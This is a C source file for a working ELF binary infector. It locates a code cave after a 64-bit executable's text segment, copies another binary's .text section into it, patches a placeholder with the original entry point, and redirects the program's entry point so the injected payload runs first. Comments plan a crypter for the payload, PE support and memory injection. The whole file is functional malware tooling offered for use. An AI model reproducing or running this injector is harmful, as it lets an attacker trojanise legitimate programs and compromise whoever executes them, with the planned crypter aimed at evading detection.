#include <elf.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>


//												ADD CRYPTER FOR THE PAYLOAD
//												MAKE IT WORK WITH PE ALSO
//												MAKE POSSIBLE TO JUST INJECT THE SHELLCODE
//												MEMORY INJECTIONi


static int get_size(char *filename) {
	struct stat st;
	stat(filename, &st);
	return st.st_size;
}


/*
	Open the file and map it to memory.
	Return the file descriptor and the size of the file.
*/
int open_and_map(char *filename, int *fsize, void **data) {
	int fd;
	*fsize = get_size(filename);

	if( (fd = open(filename, O_RDWR, 0)) < 0) 
	{
		perror("[!] Failed to open \n");
		exit(1);
	}

	if( (*data = mmap(0, *fsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0)) == MAP_FAILED )
	{
		perror("[!] Failed to mmap\n");
		close(fd);
		exit(1);
	}
	printf("[+] File %s mapped and oppened (%d bytes) at %p\n", filename, *fsize, data);

	return fd;
}


Elf64_Phdr* find_codecave(void *ptr_elf, int fsize, int *offset, int *cave_size) {

	/* 
		Declare the needed variables.
		Calculate the elf segment ptr.
		Get the total number of segments.
	*/
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *) ptr_elf;
	Elf64_Phdr *txt_segment, *elf_segment = (Elf64_Phdr *) ((unsigned char *) ehdr+ (unsigned int)ehdr->e_phoff);
	int total_segments = ehdr->e_phnum;
	int codecave = fsize;
	int txt_end;



	/*
		Traverse all the segments with type of PT_LOAD.
		Get a pointer to the entry and the offset ,of the one with execute permissions.
		Find codecave between the 2 segments.
	*/ 
	for(int i = 0; i < total_segments; i++) 
	{

		// printf("[%d] V_addr: %x\n", i, elf_segment->p_vaddr + elf_segment->p_filesz);
		if( elf_segment->p_type == PT_LOAD && elf_segment->p_flags == 0x5)
		{
			printf("[+] (#%d) LOAD segment found w execute flag (%d bytes).\n", i, (unsigned int)elf_segment->p_filesz);
			txt_segment = elf_segment;
			txt_end		= elf_segment->p_offset + elf_segment->p_filesz;
		}
		else
		{
			if( elf_segment->p_type == PT_LOAD && (elf_segment->p_offset - txt_end) < codecave )
			{
				printf("[+] (#%d) LOAD segment that can be injected found (%d bytes) near .text at offset: %p\n", 
					   i, (unsigned int)elf_segment->p_filesz, (void *)elf_segment->p_offset);
				codecave = elf_segment->p_offset - txt_end;
			}
		}
		elf_segment = (Elf64_Phdr *) ((unsigned char*)elf_segment + (unsigned int)ehdr->e_phentsize);
	}

	*offset    = txt_end;
	*cave_size = codecave;
	return txt_segment;
}


Elf64_Shdr* find_section(void *ptr_elf, char *query) {
	/*
		Set up the ptr to the elf header, section table.
		Also, get the total numbers of sections and declare var for the section name.
	*/
	Elf64_Ehdr *ehdr 	= (Elf64_Ehdr *) ptr_elf;
	Elf64_Shdr *elf_sec = (Elf64_Shdr *)(ptr_elf + ehdr->e_shoff);
	int total_sec = ehdr->e_shnum;
	char *sname;

	/*
		Create a list that would fit all the section strings.
			
	*/
	Elf64_Shdr *sec_strtab 			 = &elf_sec[ehdr->e_shstrndx];
	const char *const sec_strtab_ptr = ptr_elf + sec_strtab->sh_offset; 

	printf("[+] Searching for %s section.\n", query);

	/*

	*/
	for(int i = 0; i < total_sec; i++)
	{
		sname = sec_strtab_ptr + elf_sec[i].sh_name;
		if(!strcmp(sname, query))
		{
			printf("[+] %s section found.\n", query);
			return &elf_sec[i];	
		} 
	}

	return NULL;
}


int patch_target(void *p_entry, long pattern, int size, long entry_point) {
	p_entry = (unsigned char*) p_entry;
	int result;

	for(int i = 0 ; i < size; i++)
	{
		result = *((long*)(p_entry+i)) ^ pattern;

		if(result == 0)
		{
			printf("[+] Pattern %lx found at offset %d, replacing with %lx.\n", pattern, i, entry_point);
			*((long*)(p_entry+i)) = entry_point;
			return 0;
		}
	}
	return -1;
}


int main(int argc, char *argv[]) {
	Elf64_Ehdr *elf_header;
	Elf64_Addr e_point, base;
	Elf64_Phdr *t_txt_seg_ptr;
	Elf64_Shdr *p_txt_sec_ptr;
	void *data, *data1;
	int tsize, psize;
	int target_fd, payload_fd;
	int txt_end, cave_size;

	if(argc < 3) 
	{
		printf("Usage: %s <file to inject> <payload>\n", argv[0]);
		exit(1);
	}


	target_fd  = open_and_map(argv[1], &tsize, &data );
	payload_fd = open_and_map(argv[2], &psize, &data1);


    // Get the entry point of the target binary.
	elf_header = (Elf64_Ehdr *) data;
	e_point	   = elf_header->e_entry;
	printf("[+] Entry point of %s: 0x%x\n", argv[1], (unsigned int)e_point);


	// Find codecave between PT_LOAD segments.
	t_txt_seg_ptr 	 = find_codecave(data, tsize, &txt_end, &cave_size);
	base = t_txt_seg_ptr->p_vaddr;
	printf("[+] Codecave size  : 0x%x (%d bytes)\n", cave_size, cave_size);
	printf("[+] Codecave offset: 0x%x (%d bytes)\n", txt_end, txt_end);


	// Find the .text section and get a pointer to it.
	p_txt_sec_ptr = find_section(data1, ".text");
	printf("[+] Payload text section found at offset: %x (%lx bytes)\n", (unsigned int)p_txt_sec_ptr->sh_offset, (long unsigned int)p_txt_sec_ptr->sh_size);


	// If the payload is to big to fit in the codecave, exit.
	if(p_txt_sec_ptr->sh_size > cave_size)
	{
		perror("[!] Payload to big to inject.\n");
		close(target_fd);
		close(payload_fd);
		exit(1);
	}

	// Inject payload
	memmove(data + txt_end, data1 + p_txt_sec_ptr->sh_offset, p_txt_sec_ptr->sh_size);


	// Patch the return address after executing the payload
	patch_target(data + txt_end, 0x1111111111111111, p_txt_sec_ptr->sh_size, (long)e_point);


	// Change entry point
	elf_header->e_entry = (Elf64_Addr)(base + txt_end);


	close(target_fd );
	close(payload_fd);

	return 0;
}
